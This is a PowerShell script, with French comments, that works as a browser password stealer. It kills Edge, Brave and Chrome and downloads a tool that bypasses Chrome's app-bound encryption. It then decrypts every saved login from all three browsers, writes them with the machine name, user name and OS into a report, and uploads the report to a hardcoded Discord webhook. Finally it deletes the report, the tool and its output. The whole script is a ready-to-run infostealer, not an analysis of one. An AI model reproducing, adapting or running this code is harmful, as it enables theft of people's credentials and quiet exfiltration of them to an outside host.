$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$m)
    try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
}

Send-Discord "🚀 ULTIMATE FIX - ChromeElevator bypass - $env:COMPUTERNAME"

# Tuer navigateurs
Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
Start-Sleep 7

Set-Location $env:TEMP

# Télécharger ChromeElevator
Send-Discord "📥 Downloading ChromeElevator..."

[Net.ServicePointManager]::SecurityProtocol = 'Tls12'

try {
    # Télécharger depuis GitHub releases
    Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator.exe" -OutFile "chromelevator.exe" -UseBasicParsing
    
    if (!(Test-Path "chromelevator.exe")) {
        Send-Discord "❌ Download failed"
        exit
    }
    
    Send-Discord "✅ ChromeElevator downloaded"
    Send-Discord "🔓 Extracting ALL browsers (Edge, Brave, Chrome)..."
    
    # Exécuter ChromeElevator pour extraire TOUS les navigateurs
    $output = .\chromelevator.exe all -o output 2>&1
    
    Start-Sleep 3
    
    # Chercher les fichiers JSON générés
    $jsonFiles = Get-ChildItem -Path "output" -Filter "*.json" -Recurse -EA 0
    
    if ($jsonFiles) {
        Send-Discord "📊 Found $($jsonFiles.Count) JSON files"
        
        # Parser et convertir en format texte
        $allPasswords = @()
        
        foreach ($jsonFile in $jsonFiles) {
            try {
                $data = Get-Content $jsonFile.FullName -Raw | ConvertFrom-Json
                
                # Déterminer le navigateur depuis le chemin
                $browser = "UNKNOWN"
                if ($jsonFile.FullName -match "Brave") { $browser = "BRAVE" }
                elseif ($jsonFile.FullName -match "Edge") { $browser = "EDGE" }
                elseif ($jsonFile.FullName -match "Chrome") { $browser = "CHROME" }
                
                # Extraire les passwords
                if ($data.passwords) {
                    foreach ($pwd in $data.passwords) {
                        $allPasswords += "[${browser}] $($pwd.url)`nUsername: $($pwd.username)`nPassword: $($pwd.password)`n"
                    }
                }
            } catch {}
        }
        
        if ($allPasswords.Count -gt 0) {
            # Créer le rapport
            $report = @"
============================================================
SYSTEM INFORMATION
============================================================
Date/Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Computer: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
============================================================
TOTAL PASSWORDS: $($allPasswords.Count)
============================================================

$($allPasswords -join "`n")
"@
            
            $report | Out-File "passwords.txt" -Encoding UTF8
            
            Send-Discord "📤 Uploading $($allPasswords.Count) passwords..."
            
            curl.exe -F "file=@passwords.txt" $wh 2>$null
            
            Send-Discord "✅ UPLOAD COMPLETE - ALL PASSWORDS DECRYPTED"
            
            Remove-Item passwords.txt -Force
        } else {
            Send-Discord "⚠️ No passwords found in JSON files"
        }
        
    } else {
        Send-Discord "❌ No JSON output files found"
        Send-Discord "📋 ChromeElevator output: $($output -join ' ')"
    }
    
    # Cleanup
    Remove-Item chromelevator.exe,output -Recurse -Force -EA 0
    
} catch {
    Send-Discord "❌ Error: $($_.Exception.Message)"
}

Send-Discord "🧹 FINISHED"
